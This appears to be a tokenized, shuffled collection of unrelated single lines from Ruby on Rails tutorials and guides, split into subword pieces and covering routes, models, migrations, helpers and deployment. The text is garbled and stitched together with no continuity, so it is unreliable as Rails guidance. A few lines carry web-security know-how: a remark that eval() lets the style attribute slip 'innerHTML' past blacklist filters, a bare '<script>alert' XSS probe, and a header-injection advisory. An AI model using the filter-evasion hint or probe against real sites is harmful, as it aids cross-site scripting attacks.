▁get ▁: index
▁#### ▁ Adding ▁M e mb er ▁Route s
▁The ▁ eval () ▁function ▁is ▁a ▁ n ight ma re ▁for ▁blacklist ▁input ▁filter s , ▁as ▁it ▁allows ▁the ▁style ▁attribute ▁to ▁h ide ▁the ▁word ▁" in n er HTML " :
▁The ▁User ▁model ▁for ▁the ▁toy ▁application .
▁On ▁Unix ▁systems , ▁some ▁commands ▁should ▁be ▁executed ▁with ▁\ k ode { sudo }, ▁which ▁stand s ▁for ▁`` s ub st it ute ▁user ▁do ''
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ token _ should _ not _ be _ blank }
▁ Most ▁associations ▁with ▁standard ▁names ▁will ▁be ▁supported ▖
▁### ▁ W al k through ▁to ▁Generat ing ▁a ▁Mailer
▁Now ▁that ▁we ' ve ▁replace d ▁the ▁variable ▁part ▁of ▁the ▁page ▁title s ▁with ▁ ERb , ▁each ▁of ▁our ▁pages ▁look s ▁something ▁like ▁this :
▁#### ▁select _ date
▁With ▁this ▁declaration , ▁all ▁of ▁the ▁views ▁in ▁the ▁entire ▁application ▁will ▁use ▁` app / views / layouts / main ▖ html ▖ erb ` ▁for ▁their ▁layout .
▁# ▁Return s ▁the ▁user ▁corresponding ▁to ▁the ▁remember ▁token ▁cookie .
▁to ▁read
▁gem ▁' mysql 2 '
▁\ href { http :// p eep code ▖ com /}{ PeepCode } ▁and ▁\ href { http :// code school ▖ com /}{ Code ▁School } : ▁The ▁ screencasts ▁at ▁ PeepCode ▁and ▁inter active ▁course s ▁at ▁Code ▁School ▁are ▁consistent ly ▁high - q u al ity , ▁and ▁I ▁ w ar m ly ▁recommend ▁them .
▁ Meanwhile , ▁the ▁second ▁line ▁of ▁\ k ode { remember } ▁uses ▁the ▁\ k ode { update \_ attribute } ▁method ▁to ▁update ▁the ▁remember ▁digest ▖ ▁(
▁Rails ▁also ▁ adapt s ▁ rap id ly ▁to ▁new ▁development s ▁in ▁web ▁ tech no log y ▁and ▁framework ▁design .
▁### ▁Under st and ing ▁` yield `
▁index
▁ member ▁do
▁In ▁addition , ▁some times ▁the ▁test ▁database ▁get s ▁c or r up ted ▁and ▁needs ▁to ▁be ▁reset .
▁use ▁\ k ode { let } ▁a ▁second ▁time , ▁and ▁also ▁use ▁the ▁\ k ode { specify } ▁method .
▁` params ` ▁will ▁be ▁` { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' , ▁user _ id : ▁' 2 ' ▁}` .
▁This ▁is ▁why ▁the ▁code
▁$ ▁git ▁fetch ▁rails
▁stylesheet _ link _ tag ▁: all
▁scope ▁ shallow _ prefix : ▁" sekret " ▁do
▁#### ▁ strip _ links ( html )
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ logo _4_0 - full ▖ png }{( full ▁size )}
▁------- ---------------
▁class ▁A
▁Using ▁a ▁digest ▁for ▁password ▁resets ▁is ▁thus ▁essential .
▁This ▁make s ▁it ▁possible ▁to ▁pass ▁live ╼ Active ▁Record ▁objects ▁to ▁your ▁job ▁instead ▁of ▁class / id ▁pair s , ▁which ▁you ▁then ▁have ╼ to ▁manually ▁ de serialize ▖
▁#### ▁Link ing ▁to ▁ Image s ▁with ▁the ▁` image _ tag `
▁Fin ally , ▁we ' ll ▁add ▁a ▁custom ▁ stub ▁view ▁for ▁the ▁signup ▁page ▁( Listing ~\ ref { code : initial _ signup _ page }) .
▁( If ▁you ▁have ▁ RVM ▁installed , ▁you ▁should ▁run
▁``` a p a ch e
▁See ▁" Follow ing ▁users " ▁for ▁the ▁full ▁implementation .
▁S ince ▁` adapt er ` ▁is ▁duplicate , ▁the ▁` ENV [' DAT A BASE _ URL ']` ▁connection ▁information ▁ w in s .
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ many ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁its ▁foreign ▁key )▖
▁$ ▁git ▁push ▁ heroku
▁ dup [: b ] [: d ] ▁<< ▁5
▁Like ▁all ▁of ▁the ▁other ▁ components ▁of ▁an ▁engine , ▁the ▁assets ▁should ▁be ▁namespaced ▖╼
▁( If ▁you ' d ▁like ▁to ▁see ▁how ▁\ k ode { has \_ secure \_ password } ▁is ▁implemented , ▁I ▁suggest ▁tak ing ▁a ▁look ▁at ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { the ▁source ▁code ▁for ▁\ text tt { secure \_ password ▖ rb } }, ▁which ▁is ▁well - document ed ▁and ▁quite ▁read able .
▁You ▁can ▁also ▁help ▁out ▁by ▁examining ▁pull ▁requests ▁that ▁have ▁been ▁submitted ▁to ▁Ruby ▁on ▁Rails ▁via ▁GitHub ▖
▁These ▁are ▁\ emph { system } ▁setup s , ▁meaning ▁you ▁only ▁have ▁to ▁do ▁them ▁once ▁per ▁computer :
▁### ▁Using ▁the ▁` content _ for ` ▁Method
▁The ▁User ▁model ▁returns ▁the ▁list ▁of ▁users ▁to ▁the ▁controller .
▁The ▁secure ▁password ▁source ▁code ▁has ▁a ▁line ▁for ▁this ▁as ▁well :
▁We ▁can ▁get ▁started ▁by ▁ generating ▁a ▁template ▁test , ▁which ▁we ' ll ▁call ▁\ k ode { site \_ layout } :
▁first ▖ last @ foo ▖ jp
▁and ▁ got ▁the ▁result ▁show n ▁in ▁Figure ~\ ref { fig : activated _ user } .
▁* ▁` ActiveSupport :: Logger ▖ silencer ` ▁is ▁set ▁to ▁` false ` ▁to ▁disable ▁the ▁ability ▁to ▁ silence ▁logging ▁in ▁a ▁block ▖
▁" Product "▖ demodulize ▁# ▁=> ▁" Product "
▁This ▁will ▁find ▁all ▁clients ▁created ▁ yesterday ▁by ▁using ▁a ▁` BETWEEN ` ▁SQL ▁statement :
▁#### ▁Configur ing ▁an ▁SQLite 3 ▁Database ▁for ▁JRuby ▁P la t form
▁Note ▁from ▁Table ~\ ref { table : RESTful _ users } ▁that ▁the ▁proper ▁URL ▁for ▁a ▁user ' s ▁edit ▁page ▁is ▁ / users /1/ edit ▁( as sum ing ▁the ▁user ' s ▁id ▁is ~\ text tt {1} ) .
▁ Adding ▁a ▁ factory ▁for ▁ administrative ▁users .
▁### ▁S an ity ▁Check
▁We ▁need ▁to ▁make ▁two ▁changes ▁before ▁the ▁form ▁in ▁Listing ~\ ref { code : micropost _ form } ▁will ▁work .
▁=> ▁1
▁By ▁the ▁way , ▁if ▁you ▁have ▁deploy ed ▁your ▁sample ▁app ▁to ▁Heroku , ▁you ▁can ▁see ▁its ▁environment ▁using ▁the ▁\ text tt { heroku } ▁command , ▁which ▁provides ▁its ▁own ▁( remote ) ▁console :
▁a 2▖ x ▁# ▁=> ▁2, ▁overrid d en ▁in ▁a 2
▁The ▁[ ` T a g Assertion s ` ▁module ]( http :// api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertion s / T a g Assertion s ▖ html ) ▁( contain ing ▁methods ▁such ▁as ▁` assert _ tag ` ), ▁[ has ▁been ▁ deprecated ]( https :// github ▖ com / rails / rails / blo b / 6 06 14 7 2 b 8 c 3 10 1 58 a 2 a 2 e 8 e 9 a 6 b 8 1 a 1 a e f 6 b 60 fe / actionpack / lib / action _ dispatch / testing / assert ion s / dom ▖ rb ) ▁in ▁favor ▁of ▁the ▁` assert _ select ` ▁methods ▁from ▁the ▁` S el ec to r Assertion s ` ▁module , ▁which ▁has ▁been ▁ extract ed ▁into ▁the ▁[ rails - dom - testing ▁gem ]( https :// github ▖ com / rails / rails - dom - testing ) .
▁This ▁is ▁an ▁indicat ion ▁that ▁the ▁\ k ode { rdoc } ▁format ▁isn ' t ▁common ▁enough ▁for ▁Bitbucket ▁to ▁support ▁it ▁automatically , ▁and ▁in de ed ▁I ▁and ▁virtual ly ▁every ▁other ▁developer ▁I ▁know ▁prefer ▁to ▁use ▁\ emph { Markdown } ▁instead .
▁[ ▁ Proc ▖ new ▁ { ▁| filename , ▁path | ▁path ▁= ~ ▁ / app \ / assets / ▁&& ▁ !
▁Let ' s ▁start ▁by ▁defin ing ▁a ▁minimal ist ▁\ k ode { create } ▁action ▁for ▁the ▁Sessions ▁controller , ▁along ▁with ▁empty ▁\ k ode { new } ▁and ▁\ k ode { destroy } ▁actions ▁( Listing ~\ ref { code : initial _ create _ session }) .
▁Do ing ▁so ▁can ▁lead ▁to ▁orphan ed ▁records ▁in ▁your ▁database .
▁To ▁become ▁a ▁Rails ▁\ emph { expert }, ▁you ▁need ▁to ▁understand ▁Ruby ▁more ▁ deep ly , ▁and ▁this ▁book ▁gives ▁you ▁a ▁good ▁foundation ▁for ▁developing ▁that ▁ expert is e .
▁in ▁Listing ~\ ref { code : real _ account _ activation _ test } .
▁The ▁\ k ode { has \_ many } ▁method ▁take s ▁sever al ▁optional ▁arguments , ▁including ▁the ▁object ▁class ▁name ▁and ▁the ▁foreign ▁key .
▁( We ' ll ▁see ▁many ▁other s ▁in ▁the ▁chapter s ▁a head ▖)
▁If ▁there ▁was ▁no ▁` where ` ▁ condition , ▁this ▁would ▁generate ▁the ▁normal ▁set ▁of ▁two ▁queries .
▁create ▁app / assets / javascripts / application ▖ js
▁belongs _ to ▁: ph y s ic i an
▁If ▁you ' ve ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : repository _ host }, ▁you ▁m ight ▁notice ▁that ▁Bitbucket ▁did n ' t ▁automatically ▁ de t ec t ▁the ▁\ k ode { README ▖ rdoc } ▁file ▁from ▁our ▁repository , ▁instead ▁complain ing ▁on ▁the ▁main ▁repository ▁page ▁that ▁there ▁is ▁no ▁README ▁present ▁( Figure ~\ ref { fig : bitbucket _ no _ readme }) .
▁* ▁` active _ support ▖ initialize _ beginning _ of _ week ` ▁Set s ▁the ▁default ▁beginning ▁of ▁ week ▁for ▁the ▁application ▁base d ▁on ▁` config ▖ beginning _ of _ week ` ▁setting , ▁which ▁defaults ▁to ▁`: monday ` .
▁Of ▁course , ▁we ▁could ▁just ▁edit ▁the ▁migration ▁file ▁for ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : users _ migration }, ▁but ▁that ▁would ▁require ▁roll ing ▁back ▁and ▁then ▁migrat ing ▁back ▁up .
▁### ▁Using ▁a ▁ String ▁with ▁`: if ` ▁and ▁`: unless `
▁* ▁` config ▖ assets ▖ precompile ` ▁allows ▁you ▁to ▁specify ▁ additional ▁assets ▁( other ▁than ▁` application ▖ css ` ▁and ▁` application ▖ js ` ) ▁which ▁are ▁to ▁be ▁ precompile d ▁when ▁` rake ▁assets : precompile ` ▁is ▁run .
▁This ▁directory ▁contains ▁one ▁file , ▁` bin / rails `, ▁which ▁enable s ▁you ▁to ▁use ▁the ╼` rails ` ▁sub - commands ▁and ▁generator s ▁just ▁like ▁you ▁would ▁within ▁an ▁application ▖╼
▁A ▁second ▁option ▁is ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for }, ▁which ▁m ight ▁be ▁even ▁more ▁ idiomatic ally ▁correct ▁Rails , ▁but ▁it ▁has ▁less ▁in ▁common ▁with ▁the ▁signup ▁form , ▁and ▁at ▁this ▁stage ▁I ▁want ▁to ▁emphasize ▁the ▁parallel ▁structure .
▁# ▁Re p la ce ▁ ActionDispatch :: ShowExceptions ▁with ▁ Lifo :: ShowExceptions
▁ Hash es ▁are ▁ essentially ▁arrays ▁that ▁are n ' t ▁ limited ▁to ▁ integer ▁indices .
▁Note ▁that ▁Listing ~\ ref { code : user _ activation _ methods } ▁eliminate s ▁the ▁use ▁of ▁\ k ode { user ▖ }, ▁which ▁would ▁break ▁inside ▁the ▁User ▁model ▁because ▁there ▁is ▁no ▁such ▁variable :
▁As ▁with ▁the ▁` welcome ` ▁controller , ▁we ▁will ▁need ▁to ▁add ▁a ▁route ▁so ▁that ▁Rails ╼ k now s ▁where ▁we ▁would ▁like ▁to ▁navigate ▁to ▁see ▁` comments ` ▖
▁We ' ll ▁start , ▁as ▁usual , ▁with ▁our ▁tests .
▁Choos e ▁these ▁in ▁certain , ▁specific ▁cases ▖
▁config ▖ action _ dispatch ▖ default _ headers ▖ clear
▁This ▁work ed ▁because , ▁in ▁the ▁context ▁of ▁the ▁Users ▁controller , ▁\ k ode { will \_ paginate } ▁\ emph { assumes } ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ users } ▁( which , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : pagination }, ▁should ▁be ▁of ▁class ▁\ k ode { ActiveRecord :: Relation }) .
▁Active ▁Record ▁provides ▁the ▁`: inverse _ of ` ▁option ▁so ▁that ▁you ▁can ▁in form ▁it ▁of ▁these ▁relation s :
▁so ▁its ▁output ▁is ▁ready ▁to ▁be ▁used ▁in ▁a ▁query ▁string .
▁#### ▁D ur ation s
▁This ▁migration ▁can ▁be ▁ simplified ▁by ▁using ▁the ▁` t ▖ references ` ▁form :
▁get ▁' photos / : id ', ▁to : ▁' photos # show '
▁update ▁user ▁with ▁id ▁\ k ode {1}
▁< option ▁value =" 1 "> E g y p t </ option >
▁contains ▁a ▁\ emph { default } ▁argument , ▁which ▁in ▁this ▁case ▁is ▁the ▁empty ▁string .
▁For ▁instance :
▁The ▁user ▁\ k ode { update } ▁action ▖
▁To ▁check ▁your ▁Rails ▁installation , ▁run ▁the ▁following ▁command ▁to ▁ print ▁out ▁the ▁version ▁number :
▁The ▁method ▁` present ?` ▁is ▁equivalent ▁to ▁` ! blank ?` ▖
▁And ▁the ▁following ▁in ▁your ▁routes ▁file :
▁### ▁L ive ▁Co mp i l ation
▁The ▁method ▁` parameterize ` ▁normal ize s ▁its ▁receiver ▁in ▁a ▁way ▁that ▁can ▁be ▁used ▁in ▁ pretty ▁URLs .
▁It ▁is ▁ beyond ▁the ▁scope ▁of ▁this ▁guide ▁to ▁in form ▁you ▁on ▁how ▁to ▁secure ▁your ▁application ▁code ▁and ▁ environments ▖
▁The ▁controller ▁code ▁needed ▁to ▁get ▁these ▁tests ▁to ▁pass ▁is ▁re m ar k ably ▁con ci se : ▁we ▁just ▁retrieve ▁the ▁user ▁followed ▁or ▁to ▁be ▁followed , ▁and ▁then ▁follow ▁or ▁ unfollow ▁the ▁user ▁using ▁the ▁relevant ▁ utility ▁method .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ new _ micropost _ rails _3} .
▁The ▁reason ▁is ▁not ▁ Factory ▁Girl ' s ▁ fa ul t , ▁and ▁in ▁fact ▁it ▁is ▁a ▁\ emph { feature }, ▁not ▁a ▁bug .
▁A ▁method ▁called ▁on ▁an ▁instance , ▁such ▁as ▁\ k ode { length }, ▁is ▁called ▁an ▁\ emph { instance ▁method } .
▁With ▁this ▁change , ▁you ▁can ▁access ▁an ▁instance ▁of ▁the ▁`@ products ` ▁collection ▁as ▁the ▁` item ` ▁local ▁variable ▁within ▁the ▁partial .
▁ Default ▁Header s
▁If ▁you ▁submit ▁the ▁form ▁again ▁now , ▁Rails ▁will ▁complain ▁about ▁not ▁find ing ▁the ╼` show ` ▁action ▖
▁Here ▁both ▁the ▁directory ▁name ▁and ▁filename ▁are ▁important .
▁#### # ▁`: as `
▁See ▁the ▁ RailsCast ▁on ▁`` \ href { http :// r ailscasts ▖ com / episodes / 7 7 - destroy - with out - javascript } { Destroy ▁With out ▁JavaScript } '' ▁for ▁details .
▁At ▁this ▁point , ▁our ▁application --- with ▁an ▁important ▁c a ve at --- en force s ▁email ▁uniqueness , ▁and ▁our ▁test ▁suite ▁should ▁pass :
▁Using ▁the ▁` new ` ▁method , ▁an ▁object ▁can ▁be ▁ instantiated ▁without ▁being ▁saved :
▁U nfortunately , ▁this ▁orders ▁the ▁results ▁in ▁\ emph { as c end ing } ▁order ▁from ▁small est ▁to ▁big g est , ▁which ▁means ▁that ▁the ▁old est ▁microposts ▁come ▁out ▁first .
▁#### # ▁` DateTime ▖ current `
▁The ▁problem ▁here ▁is ▁that ▁we ▁are ▁missing ▁an ▁under ly ing ▁abstract ion .
▁To ▁see ▁what ▁these ▁parameters ╼ lo o k ▁like , ▁change ▁the ▁` create ` ▁action ▁to ▁this :
▁User ▖ find _ each ( batch _ size : ▁5 000 ) ▁do ▁| user |
▁We ▁then ▁redirect ▁to ▁the ▁root ▁URL ▁with ▁an ▁in format ive ▁flash ▁message .
▁The ▁\ href { http :// gravatar ▖ com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// www ▖ michael hartl ▖ com /}{ some ▁ dude } .
▁Your ▁scope ▁can ▁take ▁arguments :
▁A ▁failing ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { name } ▁attribute .
▁Now ▁let ' s ▁add ▁some ▁links ▁to ╼ nav ig ate ▁through ▁pages .
▁A c t u ally ▁\ emph { do ing } ▁the ▁ s caling ▁is ▁ beyond ▁the ▁scope ▁of ▁just ▁Rails , ▁but ▁rest ▁as sure d ▁that ▁if ▁\ emph { your } ▁application ▁ever ▁needs ▁to ▁handle ▁the ▁load ▁of ▁H ul u ▁or ▁the ▁ Y ellow ▁Pages , ▁Rails ▁won ' t ▁stop ▁you ▁from ▁tak ing ▁over ▁the ▁world .
▁Re visit ing ▁ strong ▁parameters
▁# ▁do ▁something ▁with ▁the ▁exception
▁The ▁above ▁code ▁execute s ▁1 ▁( to ▁find ▁10 ▁clients ) ▁+ ▁10 ▁( one ▁per ▁each ▁client ▁to ▁load ▁the ▁address ) ▁= ▁** 11 ** ▁queries ▁in ▁total .
▁It ▁also ▁differ s ▁some what ▁from ▁the ▁usual ▁material ▁covered ▁in ▁an ▁introduction ▁to ▁Ruby .
▁ Previous ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁and ▁you ▁may ▁ still ▁see ▁that ▁method ▁in ▁ legacy ▁Rails ▁applications , ▁but ▁as ▁of ▁Rails ~4▖0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁ { id : ▁ 89 , ▁name : ▁" John ▁S m i th "} ▖ to _ query (' user ')
▁Format s ▁a ▁number ▁as ▁a ▁ percentage ▁string .
▁get ▁' two ' ▁=> ▁' test # example ', ▁as : ▁: example
▁By ▁wrap p ing ▁HTTP ▁requests ▁and ▁response s ▁in ▁the ▁simple st ▁way ▁possible , ▁it ▁un if ies ▁and ▁di still s ▁the ▁API ▁for ▁web ▁server s , ▁web ▁framework s , ▁and ▁software ▁in ▁between ▁( the ▁so - called ▁middleware ) ▁into ▁a ▁single ▁method ▁call .
▁Then ▁push ▁up ▁to ▁the ▁remote ▁repository ▁and ▁deploy ▁to ▁Heroku :
▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁The ▁names ▁are ▁returned ▁as ▁symbols .
▁### ▁ Hash ▁Conditions
▁ Sign ▁up ▁for ▁an ▁\ href { http :// a w s ▖ a mazon ▖ com /}{ A mazon ▁Web ▁S er v ice s } ▁account .
▁If ▁these ▁steps ▁seem ▁mysterious , ▁take ▁he ar t : ▁I ' m ▁just ▁following ▁the ▁instructions ▁from ▁the ▁\ href { https :// github ▖ com / t w b s / bootstrap - sass } { bootstrap - sass ▁README ▁file } .
▁H i , ▁M r ▖ ▁<% ▁ puts ▁" F r o do " ▁%>
▁The ▁Rails ▁routes , ▁with ▁a ▁new ▁rule ▁for ▁Microposts ▁resources .
▁This ▁is ▁the ▁middleware ▁which ▁supports ▁the ▁ PUT ▁and ▁DELETE ▁HTTP ▁method ▁types .
▁Consider ▁as k ing ▁some one ▁from ▁the ▁ core ▁team ▁or ▁author ▁of ▁the ▁code ▁before ▁remov ing ▁it ▖
▁Because ▁of ▁the ▁heav y ▁ li f ting ▁a head , ▁it ' s ▁es pecially ▁important ▁to ▁review ▁where ▁we ' re ▁going .
▁ Previous ly ▁it ▁raised ▁` ActiveRecord :: As so ci ation Type M is match ` ▁for ▁such ▁arguments ▖
▁We ▁can ▁accomplish ▁this ▁as ▁follows :
▁as ▁show n ▁in ▁Listing ~\ ref { code : close _ route } .
▁1234567890 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁B illion "
▁We ' ll ▁start ▁by ▁visit ing ▁the ▁signup ▁path ▁using ▁\ k ode { get } :
▁Because ▁the ▁application ▁code ▁was ▁already ▁working , ▁this ▁test ▁should ▁be ▁\ line break ▁\ passing :
▁\ label { cha : rails _ flavored _ ruby }
▁NOTE : ▁The ▁actual ▁action ▁names ▁are n ' t ▁changed ▁by ▁this ▁option ▖
▁If ▁you ▁ en counter ▁such ▁an ▁issue , ▁ensure ▁that ▁you ' re ▁not ▁attempt ing ▁to ▁call ▁the ╼ application ' s ▁routing ▁methods ▁without ▁the ▁` main _ app ` ▁prefix ▁from ▁within ▁the ╼ engine .
▁Route s ▁for ▁static ▁pages .
▁If ▁` config ▖ cache _ classes ` ▁is ▁true , ▁this ▁option ▁is ▁ignore d .
▁| ▁| ▁30 6 ▁| ▁: re serv ed ▁|
▁In ▁the ▁case ▁of ▁web ▁applications , ▁the ▁`` domain ▁logic '' ▁typical ly ▁consist s ▁of ▁data ▁models ▁for ▁things ▁like ▁users , ▁articles , ▁and ▁ products , ▁and ▁the ▁ GUI ▁is ▁just ▁a ▁web ▁page ▁in ▁a ▁web ▁browser .
▁You ╼ can ▁request ▁the ▁headers ▁from ▁both ▁your ▁server ▁and ▁your ▁CDN ▁to ▁verify ▁they ▁are ╼ the ▁same :
▁ Write ▁an ▁integration ▁test ▁for ▁the ▁ expired ▁password ▁reset ▁branch ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁by ▁ filling ▁in ▁the ▁template ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ expire _ test } .
▁ Gem ▁requirements ▁for ▁this ▁app
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises })▖)
▁# ruby - gem set = railstutorial _ rails _4_0
▁General ly , ▁security ▁fix es ▁and ▁bug ▁fix es ▁are ▁good ▁can d id ate s ▁for ▁a ▁back port , ▁while ▁new ▁features ▁and ▁ patch es ▁that ▁introduce ▁a ▁change ▁in ▁behavior ▁will ▁not ▁be ▁accepted ▖
▁To ▁see ▁how ▁this ▁works , ▁we ' ll ▁complete ▁the ▁user ▁edit ▁feature ▁using ▁test - driven ▁development .
▁The ▁first ▁thing ▁to ▁generate ▁for ▁a ▁blog ▁engine ▁is ▁the ▁` Article ` ▁model ▁and ▁related ╼ controller ▖
▁When ▁you ▁declare ▁a ▁` belongs _ to ` ▁association , ▁you ▁need ▁to ▁create ▁foreign ▁keys ▁as ▁appropriate ▖
▁ Partial ▁Layouts
▁Users ▁can ▁be ▁updated ▁using ▁an ▁edit ▁form , ▁which ▁send s ▁a ▁\ text tt { PATCH } ▁request ▁to ▁the ▁\ k ode { update } ▁action .
▁A ▁ summary ▁of ▁the ▁default ▁Rails ▁directory ▁structure .
▁Instead , ▁we ▁now ▁redirect ▁to ▁the ▁root ▁URL .
▁If ▁no ▁argument ▁is ▁passed ▁a ▁call ▁generates ▁a ▁sort ed ▁series ▁of ▁key / value ▁assignment s ▁calling ▁` to _ query ( key ) ` ▁on ▁its ▁values ▖
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : microposts _ resource } .
▁We ▁can ▁upload ▁and ▁re size ▁images ▁using ▁ CarrierWave .
▁in ▁Listing ~\ ref { code : errors _ partial } .
▁* ▁`: association _ foreign _ key `
▁These ▁two ▁declaration s ▁enable ▁a ▁good ▁bit ▁of ▁automatic ▁behavior ▖
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁created , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁A ▁migration ▁to ▁add ▁a ▁\ k ode { remember \_ token } ▁to ▁the ▁\ k ode { users } ▁table .
▁* ▁Use d ▁for ▁memory ▁ caching ▖
▁The ▁` render ` ▁method ▁is ▁used ▁so ▁that ▁the ▁`@ article `╼ object ▁is ▁passed ▁back ▁to ▁the ▁` new ` ▁template ▁when ▁it ▁is ▁rendered ▖
▁Defaults ▁to ▁every ▁folder ▁in ▁the ▁` app ` ▁directory ▁of ▁the ▁application .
▁class _ name : ▁" M y Application :: Billing :: Account "
▁" equipment "▖ singularize ▁# ▁=> ▁" equipment "
▁This ▁is ▁equivalent ▁to ▁record ing ▁the ▁user ▁count , ▁post ing ▁the ▁data , ▁and ▁verify ing ▁that ▁the ▁count ▁is ▁the ▁same :
▁Now ▁with ▁all ▁the ▁pieces ▁in ▁place , ▁an ▁action ▁will ▁take ▁place ▁that ▁will ▁associate ╼ an ▁author ▁- ▁represent ed ▁by ▁a ▁record ▁in ▁the ▁` users ` ▁table ▁- ▁with ▁an ▁article ,╼ re present ed ▁by ▁the ▁` blorgh _ articles ` ▁table ▁from ▁the ▁engine .
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁Record s ▁returned ▁with ▁ additional ▁attributes ▁will ▁always ▁be ▁read - only , ▁because ▁Rails ▁cannot ▁save ▁changes ▁to ▁those ▁attributes .
▁* ▁In ▁Rails ▁4▖0 ▁when ▁a ▁column ▁or ▁a ▁table ▁is ▁re name d ▁the ▁related ▁index es ▁are ▁also ▁re name d ▖
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁Fin ally , ▁we ▁need ▁to ▁make ▁a ▁so - called ▁\ k ode { Proc file } ▁to ▁tell ▁Heroku ▁to ▁run ▁a ▁ Puma ▁process ▁in ▁production , ▁as ▁show n ▁in ▁Listing ~\ ref { code : proc file } .
▁A ▁c ra sh ▁course ▁on ▁the ▁Unix ▁command ▁line
▁My ▁form er ▁ com p any ▁( C D ▁B a by ) ▁was ▁one ▁of ▁the ▁first ▁to ▁ lo u d ly ▁switch ▁to ▁Ruby ▁on ▁Rails , ▁and ▁then ▁even ▁more ▁ lo u d ly ▁switch ▁back ▁to ▁P H P ▁( Google ▁me ▁to ▁read ▁about ▁the ▁d ra ma ) .
▁record ▖ errors [: base ] ▁<< ▁" This ▁person ▁is ▁ evi l "
▁The ▁initial ▁ SCSS ▁file ▁convert ed ▁to ▁use ▁nesting ▁and ▁variables .
▁( If ▁using ▁the ▁cloud ▁IDE , ▁you ▁may ▁have ▁to ▁refresh ▁the ▁file ▁ tree ▁as ▁describe d ▁in ▁Section ~\ ref { sec : bundler } ▖)
▁ Migration ▁with ▁the ▁same ▁name ▁already ▁exists ▖╼
▁If ▁you ▁set ▁the ▁`: validate ` ▁option ▁to ▁` true `, ▁then ▁ associated ▁objects ▁will ▁be ▁validate d ▁when ever ▁you ▁save ▁this ▁object ▖
▁ umerate }╼╼ ▁% ▁subsection ▁sample _ users ▁( end )╼╼ ▁\ subsection { P a g in ation } ▁% ▁( fold )╼ ▁\ label { sec : pagination }╼╼
▁If ▁you ▁have ▁an ▁instance ▁of ▁a ▁model ▁to ▁render ▁into ▁a ▁partial , ▁you ▁can ▁use ▁a ▁shorthand ▁syntax :
▁By ▁default ▁it ' s ▁set ▁to ▁false , ▁which ▁means ▁that ▁remote ▁forms ▁will ▁not ▁include ▁` authenticity _ token `, ▁which ▁is ▁helpful ▁when ▁you ' re ▁f ra g ment - caching ▁the ▁form ▖
▁A ▁mockup ▁of ▁the ▁user ▁index ▁with ▁delete ▁links ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ index _ delete _ links _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁<%= ▁ video _ tag ▁[" t ra ile r ▖ ogg ", ▁" mov i e ▖ ogg "] ▁%>
▁This ▁helper ▁validates ▁the ▁attributes ' ▁values ▁by ▁testing ▁whether ▁they ▁match ▁a ╼ g ive n ▁regular ▁expression , ▁which ▁is ▁specified ▁using ▁the ▁`: with ` ▁option .
▁**` ActiveRecord :: Migration :: C h ec k P end ing ` **
▁rails - flavored - ruby
▁class ▁A ▁< ▁B ; ▁end
▁The ▁` has _ and _ belongs _ to _ many ` ▁association ▁supports ▁these ▁options :
▁< script > alert (' Hello ! ')
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁I ▁suggest ▁making ▁a ▁topic ▁branch ▁as ▁usual :
▁# ▁ SELECT ▁" users " .
▁ _ In ▁any ▁case ▁this ▁is ▁a ▁serious ▁bug , ▁and ▁you ▁should ▁update ▁your ▁Rails ▁to ▁version ▁ 2▖0▖ 5 ▁or ▁ 2▖1 ▖ 2 ▁to ▁eliminate ▁Header ▁Injection ▁( and ▁thus ▁response ▁ split ting ) ▁risk s .
